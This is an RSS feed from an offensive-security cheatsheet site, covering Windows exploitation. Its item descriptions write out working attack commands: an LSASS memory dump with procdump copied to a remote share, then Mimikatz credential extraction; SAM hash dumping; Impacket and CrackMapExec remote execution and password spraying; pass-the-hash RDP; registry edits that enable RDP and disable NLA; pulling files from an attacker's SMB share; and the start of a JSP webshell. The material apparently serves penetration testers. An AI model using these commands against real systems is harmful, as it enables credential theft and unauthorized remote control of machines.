<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Exploitation on Offensive Security Cheatsheet</title>
    <link>/windows-systems/exploitation/</link>
    <description>Recent content in Exploitation on Offensive Security Cheatsheet</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    
	<atom:link href="/windows-systems/exploitation/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Exploitation Tricks</title>
      <link>/windows-systems/exploitation/exploitation_tricks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/exploitation_tricks/</guid>
      <description>Dumping LSASS # If you are SYSTEM and need creds, you can dump lsass.exe and then use Mimikatz in local procdump.exe -ma lsass.exe lsadump.dmp copy lsadump.dmp \\IP\yourshare\lsadump.dmp # Then mimikatz... privilege::debug sekurlsa::minidump lsadump.dmp sekurlsa:logonPasswords /full 
Extracting NTLM hashes from SAM database # samdump2 allows you to extract NTLM hashes from the SAM database # You need to have SAM and SYSTEM files locally samdump2 SYSTEM SAM &amp;gt; hashes.txt</description>
    </item>
    
    <item>
      <title>Remote Execution Techniques</title>
      <link>/windows-systems/exploitation/remote_execution_techniques/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/remote_execution_techniques/</guid>
      <description>Impacket tools https://www.secureauth.com/labs/open-source-tools/impacket# psexec # PSEXEC like functionality example using RemComSvc(https://github.com/kavika13/RemCom). psexec.py domain/user:password@IP &amp;lt;command&amp;gt;# smbexec # A similar approach to PSEXEC w/o using RemComSvc. The technique is described here. # Instantiating a local smbserver to receive the output of the commands. # This is useful in the situation where the target machine does NOT have a writeable share available. smbexec.py domain/user:password@IP &amp;lt;command&amp;gt;# atexec # This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.</description>
    </item>
    
    <item>
      <title>CrackMapExec</title>
      <link>/windows-systems/exploitation/crackmapexec/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/crackmapexec/</guid>
      <description>TOC  Connexions &amp;amp; Spraying Enumeration Execution &amp;amp; Co Getting credentials Using the database Modules Getting shells  # General help crackmapexec --help # Protocol help cracmapexec smb --help 
Connexions &amp;amp; Spraying # Target format crackmapexec smb ms.evilcorp.org crackmapexec smb 192.168.1.0 192.168.0.2 crackmapexec smb 192.168.1.0-28 10.0.0.1-67 crackmapexec smb 192.168.1.0/24 crackmapexec smb targets.txt# Null session crackmapexec smb 192.168.10.1 -u &amp;#34;&amp;#34; up &amp;#34;&amp;#34;# Connect to target using local account crackmapexec smb 192.</description>
    </item>
    
    <item>
      <title>Impacket</title>
      <link>/windows-systems/exploitation/impacket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/impacket/</guid>
      <description>Table of Content  General Remote Execution Kerberos Windows Secrets Server Tools / MiTM Attacks WMI Known vulnerabilities SMB/MSRPC MSSQL/TDS File Formats Others  
General # Almost every Impacket scripts follows the same option syntax authentication: -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH -no-pass don&#39;t ask for password (useful for -k) -k Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line -aesKey hex key AES key to use for Kerberos Authentication (128 or 256 bits) connection: -dc-ip ip address IP Address of the domain controller.</description>
    </item>
    
    <item>
      <title>Kerberos</title>
      <link>/windows-systems/exploitation/kerberos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/kerberos/</guid>
      <description>https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
General &amp;amp; Theory # Kerberos is just SSO, it&amp;#39;s like SAML or OpenID. # Authentication to a trusted source (KDC) # KDC delegates access # KDC = Key Distribution Center # AS = Authentication Service # TGT= Ticket Granting Ticket # TGS = Ticket Graning Service # In network, protocol used is KRB5 # TGS are for resources, not hosts # Authentication Process # - Authenticate to AS with a password → Get a TGT # - Request access to resource from TGS → Show TGT # - Valid TGT → Get TGS # - Show TGS to resource → resource accepts TGS → Log in # Each resource can check for valid TGS → Privileged Attribute Certificate (PAC) → Addition to Kerberos # NTLM Authentication # - chall/response using NT hash # - NTLMSSP # Communication with DC over NetLogon (RPC)</description>
    </item>
    
    <item>
      <title>RDP Exploitation</title>
      <link>/windows-systems/exploitation/rdp_exploitation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/rdp_exploitation/</guid>
      <description>Remote and Auto # Remotely enable RDP using CrackMapExec sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable# RDP through Pass-the-Hash xfreerdp /u:user /pth:&amp;lt;hash&amp;gt; /v:x.x.x.x 
cmd.exe # Enable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 1 /f # Disable NLA (Network Layer Authentication) requirement reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34; /v UserAuthentication /t REG_DWORD /d 0 /f # You can also do it through the firewall netsh firewall set service remoteadmin enable netsh firewall set service remotedesktop enable</description>
    </item>
    
    <item>
      <title>File Transfer</title>
      <link>/windows-systems/exploitation/file_transfer/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/file_transfer/</guid>
      <description>/etc/init.d/pure-ftpd 
SMB Server setup # Set up a SMB server using smbserver.py from impacket smbserver.py SHARE_NAME path/to/share # From target Windows: net view \\KALI_IP (Should display the SHARE_NAME) dir \\KALI_IP\SHARE_NAME copy \\KALI_IP\SHARE_NAME\file.exe . # Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user # can be usefull to PTH, or crack passwordsimpacket smbserver net use z: \\attackerip\sharename 
Build a FTP and transfer file # Set up a ftp downloading script on the target machine: echo open IP 21 &amp;gt; ftp.</description>
    </item>
    
    <item>
      <title>IIS</title>
      <link>/windows-systems/exploitation/iis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/iis/</guid>
      <description>Tips &amp;amp; Tricks # Two interfaces for tomcat /manager /host-manager# default root for IIS is C:\inetpub\wwwroot # Instead of using complicated relative path of the application use that one. # Upload to: C:\inetpub\wwwroot\shell.jsp curl http://13.33.3.37/shell.jsp 
Exploitng Host-Manager https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/ # You can exploit this and get a webshell or even reverse shell by uploading a WAR file # index.jsp &amp;lt;FORM METHOD=GET ACTION=&amp;#39;index.jsp&amp;#39;&amp;gt; &amp;lt;INPUT name=&amp;#39;cmd&amp;#39; type=text&amp;gt; &amp;lt;INPUT type=submit value=&amp;#39;Run&amp;#39;&amp;gt; &amp;lt;/FORM&amp;gt; &amp;lt;%@ page import=&amp;#34;java.</description>
    </item>
    
  </channel>
</rss>